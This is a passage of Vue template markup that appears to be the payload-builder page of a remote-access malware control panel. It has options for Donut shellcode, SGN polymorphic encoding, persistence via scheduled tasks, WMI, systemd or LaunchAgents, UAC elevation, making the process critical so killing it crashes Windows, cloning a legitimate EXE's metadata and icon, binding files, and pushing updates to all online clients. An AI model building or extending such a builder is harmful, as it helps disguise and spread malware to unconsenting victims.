            <div v-if="form.useDonut" style="margin-left:20px;display:flex;align-items:center;gap:8px"><button type="button" class="toggle toggle-sm" :class="{active: form.shellcodeConsole}" @click="form.shellcodeConsole = !form.shellcodeConsole"></button><span style="font-size:12px;color:#cbd5e1">Show console window</span></div>
            <div style="display:flex;align-items:center;gap:8px"><button type="button" class="toggle toggle-sm" :class="{active: form.useLinuxShellcode}" @click="form.useLinuxShellcode = !form.useLinuxShellcode" :disabled="!cryptableDisabled || !hasLinuxAmd64"></button><span style="font-size:12px" :style="{color: cryptableDisabled && hasLinuxAmd64 ? '#cbd5e1' : '#475569'}">Linux Shellcode</span><span style="font-size:10px;color:#64748b">linux-amd64 only</span></div>
            <div style="display:flex;align-items:center;gap:8px"><button type="button" class="toggle toggle-sm" :class="{active: form.useSgn}" @click="form.useSgn = !form.useSgn"></button><span style="font-size:12px;color:#cbd5e1">SGN Polymorphic Encoding</span></div>
            <div v-if="form.useSgn" style="margin-left:20px;display:flex;align-items:center;gap:10px"><label style="font-size:11px;color:#94a3b8">Iterations</label><input v-model.number="form.sgnIterations" type="number" min="1" max="50" class="input" style="width:60px" /></div>
          </div>

          <!-- Persistence -->
          <template v-if="!cryptableDisabled">
            <h3 style="font-size:12px;font-weight:600;color:#94a3b8;margin-bottom:10px">Persistence</h3>
            <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px"><button type="button" class="toggle" :class="{active: form.enablePersistence}" @click="form.enablePersistence = !form.enablePersistence"></button><span style="font-size:12px;color:#cbd5e1">Enable Persistence</span></div>
            <div v-if="form.enablePersistence" style="margin-left:4px;display:flex;flex-direction:column;gap:6px;margin-bottom:8px">
              <div v-for="m in PERSISTENCE_METHODS" :key="m.value" style="display:flex;align-items:center;gap:8px" v-show="hasWindows || m.value !== 'taskscheduler' && m.value !== 'wmi'">
                <button type="button" @click.stop="togglePersistence(m.value)" role="checkbox" :aria-checked="String(form.persistenceMethods.includes(m.value))" :style="{display:'flex',alignItems:'center',gap:'6px',padding:'5px 8px',borderRadius:'6px',fontSize:'12px',cursor:'pointer',background: form.persistenceMethods.includes(m.value) ? 'rgba(99,102,241,0.12)' : 'transparent', color: form.persistenceMethods.includes(m.value) ? '#818cf8' : '#64748b', border: '1px solid '+(form.persistenceMethods.includes(m.value) ? 'rgba(99,102,241,0.3)' : 'transparent')}">
                  {{ m.label }}
                </button>
              </div>
              <p style="font-size:11px;color:#475569;margin-top:4px">Linux: systemd service / desktop autostart. macOS: LaunchAgents (name must start with com.)</p>
              <div><label style="font-size:11px;color:#94a3b8;display:block;margin-bottom:3px">Startup File Name</label><input v-model="form.startupName" class="input" style="width:200px" maxlength="32" placeholder="Optional" /></div>
            </div>
          </template>

          <!-- Windows Settings -->
          <template v-if="hasWindows && !cryptableDisabled">
            <h3 style="font-size:12px;font-weight:600;color:#94a3b8;margin:16px 0 10px">Windows Settings</h3>
            <div style="display:flex;flex-direction:column;gap:6px;margin-bottom:12px">
              <div style="display:flex;align-items:center;gap:8px"><button type="button" class="toggle toggle-sm" :class="{active: form.requireAdmin}" @click="form.requireAdmin = !form.requireAdmin"></button><span style="font-size:12px;color:#cbd5e1">Require Administrator (UAC)</span></div>
              <div style="display:flex;align-items:center;gap:8px"><button type="button" class="toggle toggle-sm" :class="{active: form.criticalProcess}" @click="form.criticalProcess = !form.criticalProcess" :disabled="!form.requireAdmin"></button><span style="font-size:12px;color:#cbd5e1">Critical Process (BSOD on kill)</span></div>
            </div>

            <h3 style="font-size:12px;font-weight:600;color:#94a3b8;margin-bottom:10px">Assembly Metadata</h3>
            <div style="display:flex;flex-direction:column;gap:8px;margin-bottom:12px">
              <div><label style="font-size:11px;color:#94a3b8;display:block;margin-bottom:3px">Clone from EXE</label><input type="file" accept=".exe,.dll,.scr,.sys,.ocx" @change="clonePeMetadata(($event.target as HTMLInputElement).files![0])" style="font-size:12px;color:#64748b" /></div>
              <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
                <div><label style="font-size:11px;color:#94a3b8;display:block;margin-bottom:3px">Title (File Description)</label><input v-model="form.assemblyTitle" class="input" style="width:100%" /></div>
                <div><label style="font-size:11px;color:#94a3b8;display:block;margin-bottom:3px">Product</label><input v-model="form.assemblyProduct" class="input" style="width:100%" /></div>
                <div><label style="font-size:11px;color:#94a3b8;display:block;margin-bottom:3px">Company</label><input v-model="form.assemblyCompany" class="input" style="width:100%" /></div>
                <div><label style="font-size:11px;color:#94a3b8;display:block;margin-bottom:3px">Version (X.X.X.X)</label><input v-model="form.assemblyVersion" class="input" style="width:100%" placeholder="1.0.0.0" /></div>
                <div style="grid-column:1/-1"><label style="font-size:11px;color:#94a3b8;display:block;margin-bottom:3px">Copyright</label><input v-model="form.assemblyCopyright" class="input" style="width:100%" /></div>
              </div>
              <div><label style="font-size:11px;color:#94a3b8;display:block;margin-bottom:3px">Custom Icon (.ico, max 1MB)</label><input type="file" accept=".ico" @change="handleIconUpload" style="font-size:12px;color:#64748b" /></div>
              <div><label style="font-size:11px;color:#94a3b8;display:block;margin-bottom:3px">Output Extension</label><AppSelect v-model="form.outputExtension" :options="OUTPUT_EXTENSIONS.map(ext => ({ value: ext, label: ext }))" size="sm" style="width:130px" /></div>
            </div>

            <!-- Bind Files -->
            <h3 style="font-size:12px;font-weight:600;color:#94a3b8;margin-bottom:10px">Bind Files</h3>
            <div style="margin-bottom:12px">
              <input type="file" multiple @change="handleBindFiles" style="font-size:12px;color:#64748b" />
              <div v-for="(f, i) in form.boundFiles" :key="i" style="display:flex;align-items:center;gap:8px;padding:6px 10px;background:rgba(15,23,42,0.6);border:1px solid rgba(51,65,85,0.4);border-radius:8px;margin-top:6px;font-size:12px">
                <i class="fa-solid fa-file" style="color:#64748b"></i>
                <span style="color:#cbd5e1;flex:1">{{ f.name }}</span>
                <label style="font-size:10px;color:#64748b"><input type="checkbox" v-model="f.execute" style="accent-color:#6366f1" /> Execute</label>
                <button @click="removeBoundFile(i)" style="background:none;border:none;color:#ef4444;cursor:pointer;font-size:11px"><i class="fa-solid fa-xmark"></i></button>
              </div>
            </div>
          </template>
        </div>

        <!-- Action Buttons -->
        <div style="display:flex;gap:8px;margin-top:14px;flex-wrap:wrap">
          <button @click="startBuild" :disabled="building || !safePlatforms.length" class="btn btn-primary btn-sm">
            <i v-if="building" class="fa-solid fa-spinner fa-spin" style="margin-right:4px"></i><i v-else class="fa-solid fa-hammer" style="margin-right:4px"></i>
            {{ building ? 'Building...' : 'Start Build' }}
          </button>
          <button v-if="currentBuildId" @click="buildAndUpdateAll" :disabled="building" class="btn btn-sm"><i class="fa-solid fa-rotate" style="margin-right:4px"></i>Build & Update All</button>
          <button @click="buildAndUpload" :disabled="building || !safePlatforms.length" class="btn btn-sm"><i class="fa-solid fa-cloud-arrow-up" style="margin-right:4px"></i>Build & Upload</button>
        </div>
      </div>

      <!-- RIGHT: Output + History -->
      <div style="position:sticky;top:20px">
        <!-- Build Output -->
        <div class="panel" style="margin-bottom:12px">
          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
            <h3 style="font-size:12px;font-weight:600;color:#94a3b8">Build Output</h3>
            <button v-if="buildLogs.length" @click="buildLogs=[];buildFiles=[]" class="btn btn-xs"><i class="fa-solid fa-trash-can"></i></button>
          </div>
          <div ref="outputEl" style="height:350px;overflow-y:auto;background:#04070d;border:1px solid rgba(51,65,85,0.4);border-radius:8px;padding:10px;font-family:ui-monospace,monospace;font-size:11px;line-height:1.6">
            <div v-if="!buildLogs.length" style="color:#334155">No build output yet.</div>
            <div v-for="(line, i) in buildLogs" :key="i" :style="{color: line.level==='error'?'#ef4444':line.level==='success'?'#22c55e':line.level==='warn'?'#f59e0b':'#94a3b8'}">{{ line.text }}</div>
          </div>
          <div v-if="buildFiles.length" style="margin-top:10px;display:flex;flex-direction:column;gap:4px">
            <div v-for="f in buildFiles" :key="f.filename" style="display:flex;align-items:center;gap:8px;padding:6px 10px;background:rgba(34,197,94,0.08);border:1px solid rgba(34,197,94,0.2);border-radius:8px;font-size:12px">
              <i class="fa-solid fa-file-zipper" style="color:#22c55e"></i>
              <span style="color:#e2e8f0;flex:1;font-family:monospace">{{ f.filename }}</span>
              <span style="color:#64748b;font-size:11px">{{ f.platform }}</span>
              <button @click="downloadFile(f.filename)" class="btn btn-xs"><i class="fa-solid fa-download"></i></button>
            </div>
          </div>
        </div>

        <!-- Build History -->
        <div class="panel">
          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
            <h3 style="font-size:12px;font-weight:600;color:#94a3b8">Build History</h3>
            <button @click="loadBuilds" class="btn btn-xs"><i class="fa-solid fa-rotate"></i></button>
          </div>
          <div style="max-height:300px;overflow-y:auto;display:flex;flex-direction:column;gap:6px">
            <div v-if="!builds.length" style="padding:20px;text-align:center;color:#334155;font-size:12px">No builds yet</div>
            <div v-for="b in builds" :key="b.id" style="padding:10px;background:rgba(15,23,42,0.6);border:1px solid rgba(51,65,85,0.4);border-radius:8px">
              <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
                <span class="badge badge-xs" :style="{background: b.status==='completed'||b.status==='success' ? 'rgba(34,197,94,0.15)' : b.status==='running' ? 'rgba(56,189,248,0.15)' : 'rgba(239,68,68,0.15)', color: b.status==='completed'||b.status==='success' ? '#22c55e' : b.status==='running' ? '#38bdf8' : '#ef4444', borderColor: 'transparent'}">{{ b.status }}</span>
                <span style="font-size:11px;color:#64748b;font-family:monospace">{{ b.id?.slice(0,8) }}</span>
                <span style="font-size:11px;color:#64748b;margin-left:auto">{{ timeSince(b.startTime) }}</span>
                <span style="font-size:10px;font-family:monospace" :style="{color: expiryColor(b.expiresAt)}">{{ expiresIn(b.expiresAt) }}</span>
              </div>
              <div v-for="f in b.files || []" :key="f.filename" style="display:flex;align-items:center;gap:6px;font-size:11px;margin-top:4px">
                <i class="fa-solid fa-file-zipper" style="color:#475569;font-size:10px"></i>
                <span style="color:#cbd5e1;font-family:monospace;flex:1">{{ f.filename }}</span>
                <span style="color:#64748b">{{ f.platform }}</span>
                <button @click="downloadFile(f.filename)" class="btn btn-xs"><i class="fa-solid fa-download"></i></button>
              </div>
              <div style="display:flex;justify-content:flex-end;margin-top:6px">
                <button @click="deleteBuild(b.id)" class="btn btn-xs" style="color:#ef4444" title="Delete"><i class="fa-solid fa-trash"></i></button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Update All Modal -->
    <div v-if="showUpdateAllModal" class="modal-overlay" @click.self="showUpdateAllModal = false">
      <div class="modal" style="max-width:420px">
        <div class="modal-header"><h3 class="modal-title">Build & Update All</h3><button @click="showUpdateAllModal=false" class="modal-close"><i class="fa-solid fa-xmark"></i></button></div>
        <div v-if="updateAllResult" style="display:flex;flex-direction:column;gap:8px">
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:13px">
            <div><span style="color:#64748b">Total online:</span> <span style="color:#e2e8f0">{{ updateAllResult.totalOnline }}</span></div>
            <div><span style="color:#64748b">Eligible:</span> <span style="color:#22c55e">{{ updateAllResult.eligible }}</span></div>
            <div><span style="color:#64748b">Skipped (in-memory):</span> <span style="color:#f59e0b">{{ updateAllResult.skippedInMemory }}</span></div>
            <div><span style="color:#64748b">Skipped (no match):</span> <span style="color:#64748b">{{ updateAllResult.skippedNoMatch }}</span></div>
          </div>
        </div>
        <div class="modal-actions"><button @click="showUpdateAllModal=false" class="btn btn-sm">Cancel</button><button @click="confirmUpdateAll" class="btn btn-primary btn-sm">Update All ({{ updateAllResult?.eligible || 0 }})</button></div>
      </div>
    </div>
  </div>
</template>

<style scoped>
.settings-tab { padding:10px 16px; font-size:0.875rem; font-weight:500; color:#64748b; background:transparent; border:none; border-bottom:2px solid transparent; transition:all 140ms ease; cursor:pointer; }
.settings-tab:hover { color:#94a3b8; }
.settings-tab-active { color:#e8edf2; border-bottom-color:#6366f1; }
.toggle-sm { width:32px; height:18px; }
.toggle-sm::after { width:14px; height:14px; }
.toggle-xs { width:28px; height:16px; }
.toggle-xs::after { width:12px; height:12px; }
</style>
